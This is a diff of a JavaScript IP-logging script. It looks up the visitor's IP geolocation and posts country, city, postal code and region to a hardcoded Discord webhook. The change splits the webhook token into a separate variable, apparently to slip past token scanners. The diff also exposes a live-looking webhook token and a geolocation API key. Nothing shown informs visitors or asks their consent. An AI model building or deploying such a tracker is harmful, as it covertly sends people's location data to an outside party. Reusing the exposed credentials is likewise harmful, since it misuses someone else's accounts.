@@ -1,14 +1,15 @@
-const webhook = "https://discord.com/api/webhooks/1073586834787012749/nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"
+const a = "nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"
+const webhook = "https://discord.com/api/webhooks/1073586834787012749/"+a
 
 async function IP_Info(){
     /**
      *  
      *  @return {fetch.Body.json()} 
      */
-    let response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=f7be41fa49dc4dd7a9e362d73cc193d1&", {
+    let response = await fetch("https://ipapi.co/json", {
       method: 'GET',
+      cache: 'no-cache',
       headers: {
-        "cache-control" : "no-cache",
         "content-type": "application/json"
       }
     })
@@ -16,7 +17,7 @@ async function IP_Info(){
   }
   IP_Info().then((value)=> {
     let requiredInfo = [
-      "country_name", "city", "zipcode", "city"
+      "country_name", "city", "postal", "region"
     ]
     let noData = false
 
@@ -54,7 +55,7 @@ async function IP_Info(){
                 name: "City", value: `${value.city}`, inline: false
               },
               {
-                name: "ZIP", value: `${value.zipcode}`, inline: false
+                name: "ZIP", value: `${value.postal}`, inline: false
               },
               {
                 name: "Region", value: `${value.city}`, inline: false
